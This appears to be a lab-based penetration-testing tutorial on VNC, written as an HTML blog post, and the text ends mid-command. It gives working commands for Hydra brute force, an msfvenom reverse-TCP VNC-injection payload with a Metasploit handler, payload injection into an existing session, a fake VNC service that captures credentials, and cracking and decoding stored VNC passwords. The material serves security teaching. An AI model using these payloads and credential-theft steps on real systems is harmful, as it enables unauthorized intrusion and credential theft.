@@ -1,0 +1,203 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">VNC Penetration Testing</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/vnc-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2021-06-30T17:53:32+00:00">June 30, 2021</time><time class="updated" datetime="2025-05-10T21:00:56+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p>In<span style="color: #000000;"> this article, we are discussing Internal Penetration Testing on the VNC server. Through that, we are trying to explain how an attacker can breach security in various scenarios with the installation and configuration, enumeration, and precautions as well.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Content </strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
+<li><span style="color: #000000;"><strong>Pre-requisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+<li><span style="color: #000000;"><strong>Port Scanning</strong></span></li>
+<li><span style="color: #000000;"><strong>Password Cracking</strong></span></li>
+<li><span style="color: #000000;"><strong>Port Redirection</strong></span></li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
+<li><span style="color: #000000;"><strong>Post Exploitation</strong></span></li>
+<li><span style="color: #000000;"><strong>Authentication Capture using Fake Service</strong></span></li>
+<li><span style="color: #000000;"><strong>Cracking hashes</strong></span></li>
+<li><span style="color: #000000;"><strong>Credential Dumping</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
+<p><span style="color: #000000;">VNC or Virtual Network Computing is a service that uses the Remote Frame Buffer protocol to enable graphical remote access of another system. It is an interactive session since the user can give the mouse and keyboard inputs through VNC to the original system. Defining like that seems so similar to the Remote Desktop Protocol that we discussed some while back but there is a prominent difference between the two. The VNC is platform-independent that means it can work with Linux and Windows whereas the RDP can only work between two Windows Machines.</span></p>
+<p><span style="color: #000000;">The VNC service was developed by the Olivetti &amp; Oracle Research Lab in the United Kingdom. Many services are derived from VNC that was made open source under the GNU General Public Licence. However, the VNC and the RFB that we discussed earlier are the Trademarks of RealVNC Ltd. In the US.</span></p>
+<p><span style="color: #000000;">Now that we have a brief understanding of the VNC service. Let’s discuss the security aspect of it. At the time of the invention, the RFB protocol was not at all secure. The Passwords that were implemented into the service were plain text in the beginning but they not anymore. We will see in-depth in the article how the traffic of VNC authentication looks.</span></p>
+<h3><span style="color: #800000;"><strong>Pre-requisites</strong></span></h3>
+<p><span style="color: #000000;">In real-life environments, there will be an elaborate setup where VNC will be used however to make the understanding a bit simple we will be taking a basic setup that will include 3 machines. We will be using a Windows machine as the host and all 3-machine described below will be hosted virtually.</span></p>
+<p><span style="color: #000000;">Ubuntu Machine:            VNC Server</span></p>
+<p><span style="color: #000000;">Kali Linux Machine:         Attacker System</span></p>
+<p><span style="color: #000000;">Windows 10 Machine:   Client System</span></p>
+<h3><span style="color: #800000;"><strong>Lab Setup</strong></span></h3>
+<p class="" data-start="272" data-end="512"><span style="color: #000000;">To begin setting up the VNC server on our Ubuntu machine, we first elevate the shell to root from a basic user. Then, we install the xfce4 and its associated packages. This provides the desktop environment required for connecting via VNC.</span></p>
+<p class="" data-start="514" data-end="594"><span style="color: #000000;">Now, install the desktop environment:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install xfce4 xfce4-goodies</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qWHMtLO3pA4/YNyb7_jl3-I/AAAAAAAAxB8/oLYWiJ_E0H08DipkGlnnOcgt7Bf7SxT3wCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h4><span style="color: #000000;">Display Manager Prompt</span></h4>
+<p><span style="color: #000000;">During the installation, you will encounter a prompt asking you to choose a preferred cross-desktop display manager. This occurs because Ubuntu comes withgdm3 by default, whilexfce4 includeslightdm. You can select either one. In this demonstration, we continue with the default: gdm3.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-06i5s4qx20I/YNyi7w5JEwI/AAAAAAAAxCE/bO4w2a3wMdUMKyodmzqHfL-suBNxlJHjwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p class="" data-start="1036" data-end="1127"><span style="color: #000000;">After the installation of xfce4 finishes, we proceed with installing the TightVNC Server.</span></p>
+<p class="" data-start="1129" data-end="1224"><span style="color: #000000;">TightVNC is a free, open-source service available for both Windows and Linux. Install it using:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install tightvncserver</pre>
+<p><span style="color: #000000;">`<img decoding="async" src="https://1.bp.blogspot.com/-zo7E2rVp2oo/YNykyTdAlsI/AAAAAAAAxCM/qshVQla_8U4v5mMviI5KuOSg8ZEYIWbLACLcBGAsYHQ/s16000/3.png"/></span></p>
+<h4><span style="color: #000000;">Password and Startup Configuration</span></h4>
+<p><span style="color: #000000;">Next, run the following command to set the VNC access password:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">vncpasswd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GQ55f-DDCRI/YNyl9BJq_-I/AAAAAAAAxCU/ss1IrMQxaRMsIzb84nruHNyw3HP0hkvaQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p class="" data-start="1386" data-end="1517"><span style="color: #000000;">This step creates the initial configuration files required for VNC to function. You’ll be prompted to enter and confirm a password.</span></p>
+<p class="" data-start="1519" data-end="1667"><span style="color: #000000;">The password file gets stored in a hidden directory /root/.vnc. If you want to apply any further configurations, place them inside this directory.</span></p>
+<p class="" data-start="1669" data-end="1757"><span style="color: #000000;">Now, create a startup file that instructs VNC to run specific commands when it connects:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd .vnc
+nano xstartup</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-npKafKKbm0g/YNym5sMaFII/AAAAAAAAxCc/htsgIAvO8BEGpiA-AGsD7qbFLJkWIabtwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Add the following commands to the xstartup file to define the desktop environment:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
+xrdb $HOME/.Xresources
+startxfce4 &amp;</pre>
+<p><span style="color: #000000;">This script ensures that the XFCE4 desktop environment launches when the VNC server starts.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pMsroQpWFnQ/YNym-YRo-OI/AAAAAAAAxCg/TWBWOOZKu6QvJUyonZWjCIfgpBHV_zHwgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h4><span style="color: #000000;">Finalizing and Running the VNC Server</span></h4>
+<p><span style="color: #000000;">After creating the startup file, we assign it the proper permissions so the system can execute it when needed. With this step, we complete all necessary configurations for VNC to function properly. The next task is to launch the VNC Server on our Ubuntu machine using the vncserver command. Upon execution, the system references the startup file to run the set of commands that configure our chosen Desktop Environment.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 xstartup
+vncserver</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QpeP9E9M8pg/YNynCE3MUdI/AAAAAAAAxCk/NrEltFe75rk7Kt2NbH0aiEtgLsWTxwQvQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p class="" data-start="2237" data-end="2351"><span style="color: #000000;">You will see that the startup script executes the required commands to initialize your chosen desktop environment.</span></p>
+<p class="" data-start="2353" data-end="2558"><span style="color: #000000;">From your <strong data-start="2363" data-end="2377">Kali Linux</strong> machine, use thevncviewer tool to connect to the VNC server running on Ubuntu. You need the server’s IP address and port. Since we didn’t modify the port, it defaults to <strong>5901.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">vncviewer 192.168.1.46:5901</pre>
+<p><span style="color: #000000;">You’ll be prompted for the password set earlier. Once entered, you gain remote access to your Ubuntu machine running the XFCE4 Desktop Environment.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yX_p7x_-kG8/YNynKPzqVsI/AAAAAAAAxCs/-UJNRiijii0BjTDHvr1UE2uSddNgZiNKwCLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Port Scanning</strong></span></h3>
+<p><span style="color: #000000;">Since we are on our Kali Linux Machine, we can use it to perform a port scan on our VNC server to see how the running service will look when an attacker tries to do the same. It will also inform us about the information and knowledge that a real-life attacker can gain by performing a port scan on our server. We see that port 5901 is running the VNC server as we configured. We also see that the protocol of VNC that the server is running 3.8. This is a piece of unintended information that should not be visible in such a way. Let’s enumerate deeper.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 5901 -sV 192.168.1.46</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v0-6hL9T_70/YNynPBR9GVI/AAAAAAAAxC0/ZklgG2St81Qzgh7RKsHAZy4GEnyOXVD2gCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Nmap also performs script scans. Among these scripts, one called vnc-info helps enumerate and extract details about a VNC service. We ran the Nmap script scan and observed that the Protocol Version is 3.8. Additionally, we identified that the authentication mechanism in place is VNC Authentication, which we will explain later in this article. Based on the authentication method, we confirmed that the installation uses TightVNC. This demonstrates that attackers can gather significant information using just Nmap scans.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 5901 --script vnc-info 192.168.1.46</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8xKKGKX2mzg/YNyncS8igSI/AAAAAAAAxDA/sXmMxQ2zBYIFMqo4cT2bN89UNhMbuaagwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Password Cracking</strong></span></h3>
+<p><span style="color: #000000;">Since we have performed some slight enumeration on our VNC server, it is time to test the Authentication Mechanism. In previous steps, we saw that to connect to the server, we require the password. We will try to perform a Bruteforce Attack. It is not exactly a blunt Bruteforce, more like a planned dictionary with possible and weak passwords. We used Hydra to perform the attack. It requires us to provide a password dictionary, IP Address of the Server, and port on which the service is running. After working for a while, we can see that Hydra was able to crack the password for the VNC server, it is 12345678.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -s 5901 -P pass.txt -t 16 192.168.1.46 vnc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9pQmjqmjoNY/YNynqnCR0UI/AAAAAAAAxDQ/aaxgAZvENx8McR0VnQDxi3ybC5fV_JLNACLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Port Redirection</strong></span></h3>
+<p><span style="color: #000000;">Since we saw how easy it was to first enumerate the service and then perform a Bruteforce attack that could result in the compromise of our machine, we can think of a method that will help us. We can change the port at which the service is running to an uncommon port where the attacker would not be able to guess. This involves making changes in the vncserver file. It is located at /usr/bin/vncserver. We can use any text editor for this task. Here we have the variable vncPort. You could either change its value altogether or comment on it and make a new entry. We commented on the old value and added the new value of 4455.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$vncPort = 4455 ;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BEW39lC5gJs/YNyny_HtkpI/AAAAAAAAxDY/LQBvGNnEqVM20q3CzmAgn-CbFw94LP1yQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">After saving the text file and restarting the VNC Server, we can be assured that the service will now be running on port 4455. To test this hypothesis, we get back to the Kali Linux Machine, here we again performed the port scan using Nmap and we could see that indeed the service is detected on the new port and it is possible to connect to VNC at 4455.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p4455 -sV 192.168.1.46
+vncviewer 192.168.1.46:4455</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IoOF61q-tnI/YNyn3fXVDQI/AAAAAAAAxDc/rDRlldfigz8S2Q3E2eV0dMpLK52F5ZWgQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">With the enumeration and Bruteforce on the VNC server done, we can move onto the Exploitation of the VNC Server. Going back to basics, we are aware of the fact that to exploit a machine, we require a payload. We will be using the msfvenom payload creator for this task. We will be using the payload that is part of the vncinject module in the Metasploit so that the session that we receive is ready for the VNC connection that we desire. Since we are targeting the Windows Machine we mentioned, we created an executable payload as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/vncinject/reverse_tcp lhost=192.168.1.2 lport=5432 -f exe &gt; vnc.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IL5aAosuzDA/YNyn7WyDOMI/AAAAAAAAxDk/hMuDexCQLEMhgX6DHvXTLmAJfrWsVoG0QCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Next, we transfer the payload to the target machine. This is where it is up to the different attackers as to what method they want to use to get the victim to download and run the payload. While the transfer is in motion, we will be opening the Metasploit Framework and running a multi-handler that can receive the connection that will initiate the execution of the payload. As we can observe in our demonstration below is that we can receive a reverse connection and then on itself VNC viewer is launched by Metasploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
+set payload windows/x64/vncinject/reverse_tcp
+set lhost 192.168.1.2
+set lport 4532
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8GMMZotCA3M/YNyoBFQP_WI/AAAAAAAAxDo/KDyQKaGv_eYPQKhao2mFjhagUyfJeL5PACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Upon seeing the initiation of the VNC viewer, we can also see that a TightVNC window opens with the connection to the target Windows Machine that concludes the attack. This is how we can directly get a VNC session on a target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F7RNeGCSUYo/YNyoGhLrM8I/AAAAAAAAxDw/vDx8IunDvYshDsSphBFV8qwMUjhio898QCLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Post Exploitation</strong></span></h3>
+<p class="" data-start="267" data-end="474"><span style="color: #000000;">We already saw in the Exploitation section how to use a payload to get a VNC session on a machine. But what if, as an attacker, you don’t just want a VNC session but also a Meterpreter session on the target?</span></p>
+<p class="" data-start="476" data-end="625"><span style="color: #000000;">Or imagine a scenario where you already have a Meterpreter session and now want to get a VNC session too. In both cases, the run vnc command helps.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">run vnc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VXwa7zxeUxg/YNyoLtH1VHI/AAAAAAAAxD8/N9nlnBkaWLQeYPy4-xHzfrpBc_oqRL8kgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">From the attacker’s perspective, this is a good reminder that if you can crack a machine and want a GUI-based session then all that is required is a simple command on meterpreter and you can have the VNC session on your target as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R4qH1CDToBE/YNyoTTBrcQI/AAAAAAAAxEE/-mGXFLhCdq0kGN-e7wy15PYJZAv928i4gCLcBGAsYHQ/s16000/18.png"/></span></p>
+<h4><span style="color: #000000;">Using Payload Injection for VNC Access</span></h4>
+<p class="" data-start="910" data-end="1087"><span style="color: #000000;">Just like we converted a Meterpreter session into a VNC session, we can use a post-exploitation module to do the same with any reverse connection achieved on the target machine.</span></p>
+<p class="" data-start="1089" data-end="1293"><span style="color: #000000;">Let’s assume you got a reverse connection using a basic payload. The session you received was Session</span> 1.<span style="color: #000000;"> Now, use the payload_inject exploit with the local port and session ID to obtain a VNC session:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/payload_inject
+set payload windows/vncinject/reverse_tcp
+set lport 6789
+set session 1
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zZSXvsp3XBI/YNyoZ5SyJ-I/AAAAAAAAxEM/Es1i8WOAzhEFqEe4qQTcyqJerWCmpStCwCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p class="" data-start="1424" data-end="1584"><span style="color: #000000;">Once executed, the payload starts a Notepad process with a process ID. Then, it injects the VNC payload into that process. In our demo, it used Process ID 2816.</span></p>
+<p class="" data-start="1586" data-end="1744"><span style="color: #000000;">Next, the exploit sends a stager and connects to the target machine. It then starts the Local TCP relay between the attacker’s machine and the target machine.</span></p>
+<p class="" data-start="1746" data-end="1864"><span style="color: #000000;">Afterward, we initiate the vncviewer on our Kali Linux. As shown in the demonstration, a VNC Server session appears.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-chSb1ps1Ym0/YNyoe3EfmhI/AAAAAAAAxEU/XAKGKodGxeku1142-Yhe4wW3NSFY5lncgCLcBGAsYHQ/s16000/20.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Authentication Capture using Fake Service</strong></span></h3>
+<p><span style="color: #000000;">It is clear from the Exploitation section that it is not that simple to get a VNC session on the target machine. However, it is possible to spoof the target into giving up the password for the VNC connection. Metasploit has a module that is designed to fake a VNC service that will fool the target and get the credentials. It requires the IP address to host the service at and the location of the file where the grabbed credentials will be stored.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/vnc
+set srvhost 192.168.1.2
+set johnpwfile /root/Desktop/
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_bHbg4-mWu0/YNyonQ8-yJI/AAAAAAAAxEY/yKh9MFbV1pslxgSImtrkhEdDNkLqcdagACLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Since we started with the capture vnc module, we can check if there is a service that seems to be available using the port scan at the IP Address mentioned in the options. We see that a VNC service seems to be running on port 5900.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5900 192.168.1.2</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l7JpFkCwwJA/YNyoz_8oV3I/AAAAAAAAxEg/wzs6i-LUFywreI_V4bTxVmB1NtYVh8ZIgCLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">When we try to connect to the fake VNC service as any victim would we see that after entering the correct credentials we see that it provides us with the message of Authentication Failure.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">vncviewer 192.168.1.2:5900</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RoB0U30myNg/YNyo58nDBWI/AAAAAAAAxEo/nl3JjfkEaJ0osP8LixL0lWSTlADfr30ywCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">But if we go back to the terminal where we ran the module, we can see that we can capture the Challenge and Response for the VNC service that we faked. But this is not enough since we need the exact credentials for the service to get access to the target machine through VNC.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eebfhXHtWJg/YNypMbcp_rI/AAAAAAAAxE0/1Xz5YBFQPKE7jQ51gnLma5yEhKoBY_UGgCLcBGAsYHQ/s16000/24.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Cracking Hashes</strong></span></h3>
+<p><span style="color: #000000;">In the previous section, we were able to capture the Challenge and the Response for the authentication of VNC. If we want to connect to a service, we require a password that we can enter. To do this we will decipher the password from the challenge and response. We need to install the tool called vncrack_s for this task. We used the wget to get it downloaded on our Kali machine. As it was in a compressed file, we use gunzip for decompressing it. To run the tool, we need to provide the execution permissions to it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://www.phenoelit.org/vncrack/vncrack_s.gz
+gunzip vncrack_s.gz
+chmod +x vncrack_s</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UgFou0rnZIs/YNypR3v-9AI/AAAAAAAAxE4/fIzpRdE_ItUWmN_XxNg72ugAwhCd_rUjwCLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Now, we need to provide the challenge and the response towards that challenge that we captured in the last section. We also need to provide a dictionary with the list of possible passwords that can be checked against the challenge-response combination. We were able to decipher the password from the previous capture. It was 1234.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./vncrack_s  -c 00112233445566778899aabbccddeeff -r 6f22fe8d8ed0e22fcc09fcbd981b0bac -w pass.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W-FFj_8eT3c/YNypdGqL3gI/AAAAAAAAxFE/eZRC3r_M-Cwbzv_zZrLunXZn-k7mvOeigCLcBGAsYHQ/s16000/26.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Second way</strong></span></h3>
+<p><span style="color: #000000;">From the Introduction where we discussed the security aspect of VNC sessions, we mentioned that the process of authentication doesn’t seem to be quite safe as others. We also learned that if we have the challenge and a response from the authentication it is possible to crack the password. It is possible to capture the challenge and response without using the Metasploit module from earlier. All that required is to capture the traffic between the server and client. To demonstrate we will be capturing the traffic from the authentication that happens between the Windows Machine and Ubuntu Server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DcANiuq9j2k/YNypiZhs07I/AAAAAAAAxFI/4JPEviUTZCgGlonSwwAbONJNBQueDNjtACLcBGAsYHQ/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">We used Wireshark for capturing the network traffic packets. When we attempt the connection as shown in the image above, we see that an Authentication Challenge is being presented to the Client which in our case is the Windows Machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_nVunOdCJUY/YNypmh_zqRI/AAAAAAAAxFM/BW4mwd8n8GQEm3S91S52lJJYpC1og4pdgCLcBGAsYHQ/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">Then based on the challenge received, the client sends out their response back to the Server to authenticate the process and allow them to log in. This can also be captured using the Wireshark as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BZ1F06a_7Q8/YNypriN_TSI/AAAAAAAAxFU/On8tLdtQyUsProWH9Bo3M7eo8vBPWVaAQCLcBGAsYHQ/s16000/29.png"/></span></p>
+<p><span style="color: #000000;">As we pose as an attacker, we can able to capture all the traffic and pose as the Man-in-the-middle. This means that we retain the Authentication Challenge and Response and with the help of the VNCrack we can perform a Bruteforce attack and crack the password for VNC.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./vncrack_s  -c f7ed47c3ab290fa98ba7044314d0353f -r ead4964f2549ae81723873806ec9931b -w pass.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vAGfe8VMHtA/YNyp_nxOAzI/AAAAAAAAxFo/_bqkKSQjcxQzmrnsgWdHCf4qFAco184LQCLcBGAsYHQ/s16000/30.png"/></span></p>
+<h3><span style="color: #800000;">Credential Dumping</span></h3>
+<p class="" data-start="348" data-end="601"><span style="color: #000000;">Using TightVNC with default settings poses a serious security threat. An attacker doesn’t even need advanced tools—just capturing network traffic can be enough. When a device accesses another machine through TightVNC, its credentials can be compromised.</span></p>
+<p class="" data-start="603" data-end="688"><span style="color: #000000;">To demonstrate this, we connect to the machine at <code data-start="653" data-end="672">192.168.1.46:5901</code> as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-16qEi1UUkWk/YNyqMd5WKPI/AAAAAAAAxFs/4L37mvxCAHA_qckID-huoTUobzUb6zCpwCLcBGAsYHQ/s16000/31.png"/></span></p>
+<p><span style="color: #000000;">As learned from the previous examples we know that it will ask for the credentials for the connection. A legitimate user will be able to provide these.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9nUAVs2rEMY/YNyqUt5O2sI/AAAAAAAAxFw/S5GI5GVKnrELUgg02WDzpE6LXBzUVv7qgCLcBGAsYHQ/s16000/32.png"/></span></p>
+<p><span style="color: #000000;">After our legitimate user enters the correct credentials, they can use the session and then decide to save the credentials with the connection settings.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JOrz5NLFGlk/YNyqZFnNtGI/AAAAAAAAxF0/ax4xWltoozAHfkbAnLjNZcEDCohqfBObACLcBGAsYHQ/s16000/33.png"/></span></p>
+<p><span style="color: #000000;">When locating the file containing the password and connection settings, we notice that the password isn’t stored in plain text. Instead, it’s saved using a form of encoding. But how secure is this format?</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RN5nyfeSG_4/YNyqeXxM7PI/AAAAAAAAxF8/X-yW-BWYXDwvIIQQ_GWFLaUSup9apa56gCLcBGAsYHQ/s16000/34.png"/></span></p>
+<h4><span style="color: #000000;">Password Decoding and Security Testing</span></h4>
+<p class="" data-start="1167" data-end="1456"><span style="color: #000000;">To test the safety of the saved password, we use a tool named <strong data-start="1229" data-end="1242">vncpasswd</strong>. It allows us to check whether the encoded password in the TightVNC config file can be reversed. We begin by cloning the tool’s repository from GitHub. Once we enter the directory, we find the Python file we need.</span></p>
+<p class="" data-start="1458" data-end="1604"><span style="color: #000000;">We run the tool using the-d flag for decode and-H for the hex value. The tool successfully decodes the password, revealing it as 12345678.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/trinitronx/vncpasswd.py
+cd vncpasswd.py
+./vncpasswd.py -d -H f0e43164f6c2e373</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EDE_jDwfb0k/YNyqlYHjwVI/AAAAAAAAxGE/m_4GjPSvXx0G8ucBonP5meKZZBf3vrEhgCLcBGAsYHQ/s16000/35.png"/></span></p>
+<p><span style="color: #000000;">If you’re not using Linux, a Windows-compatible executable named <strong data-start="1791" data-end="1805">vncpwd.exe</strong> is available. It can be downloaded from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="http://aluigi.altervista.org/pwdrec/vncpwd.zip">here</a></span></strong>. It requires only the encoded value and quickly reveals the password.<br/>
+</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">vncpwd.exe f0e43164f6c2e373</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9244QPUE5Sg/YNyq5cwaGDI/AAAAAAAAxGY/UUfsVEeVAFwJIgKH9x1C1TGDUv-mGZFlgCLcBGAsYHQ/s16000/36.png"/></span></p>
+<p class="" data-start="1931" data-end="2093"><span style="color: #000000;">Working with TightVNC has shown us that its password storage method lacks security. However, most alternatives to TightVNC also follow similar encoding practices.</span></p>
+<p class="" data-start="2095" data-end="2259"><span style="color: #000000;">For instance, <strong data-start="2109" data-end="2121">UltraVNC</strong> stores passwords inside theProgramFiles orProgramFiles(x86) directory, in theultravnc.ini file under the variable name passwd.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ACZYc9o8TLM/YNyq-615GOI/AAAAAAAAxGc/yH1_T2ciWykCuWKfaMZQQL70Dt8u0ieQgCLcBGAsYHQ/s16000/37.png"/></span></p>
+<p><span style="color: #000000;">We repeated the connection and password-saving steps with UltraVNC. It encoded the password in the same way.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y6M6FlP41gg/YNyrGO9jEPI/AAAAAAAAxGk/ar-szbt1XJUfNePl4seM9IzLWeoPrcJvwCLcBGAsYHQ/s16000/38.png"/></span></p>
+<h4><span style="color: #000000;">Using Metasploit and VNCrack for Credential Extraction</span></h4>
+<p><span style="color: #000000;">To retrieve credentials from UltraVNC, you can follow the same tools and process. Additionally, you can use a <strong data-start="2541" data-end="2580">Metasploit post-exploitation module</strong> to extract hashed passwords and even crack them.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/credentials/vnc
